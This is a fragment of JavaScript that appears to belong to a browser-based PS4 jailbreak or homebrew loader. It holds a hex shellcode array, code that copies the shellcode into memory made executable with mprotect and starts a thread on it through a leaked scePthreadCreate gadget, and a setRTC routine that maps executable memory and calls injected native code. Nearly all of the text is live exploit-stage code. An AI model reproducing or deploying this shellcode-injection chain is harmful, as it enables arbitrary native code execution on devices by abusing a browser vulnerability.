0xe8e78944, 0xfffffef8, 0xf1e8ef89, 0x48fffffe, 0x200000b8, 0x00000926, 0x48d0ff00, 0x5b10c483, 0xc35c415d, 0xc3c3c3c3];
				var shellbuf = p.malloc32(0x1000);
				for (var i = 0; i < shcode.length; i++)
					shellbuf.backing[i] = shcode[i];
				p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
				//p.fcall(window.gadgets["createThread"], shellbuf, 0, p.stringify("loader"));
				var thread_id_ptr = p.malloc(0x08);
				p.fcall(window.gadgets["scePthreadCreate"], thread_id_ptr, 0, shellbuf, 0, p.stringify("loader"));
				window.awaitpl(); // Awaiting payload message
			} catch (e) { alert(e); }
		}
	}
	//showPayloads();
};

window.setRTC = function(year, month, day, hours, minutes, seconds) {
	var code_addr = new int64(0x26100000, 0x00000009);
	var buffer = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
	if (buffer == '926100000') {
		var date1 = new Date(2012, 01, 01, 0, 0, 0);
		var date2 = new Date(year, month, day, hours, minutes, seconds);// <-- these need to be made user selectable
		var timetoset = (date2.getTime() - date1.getTime())/1000;
		writeHomebrewEN(p, code_addr.add32(0x100000), timetoset);
		alert(timetoset);
	}
	p.fcall(code_addr);
	alert("Success");
};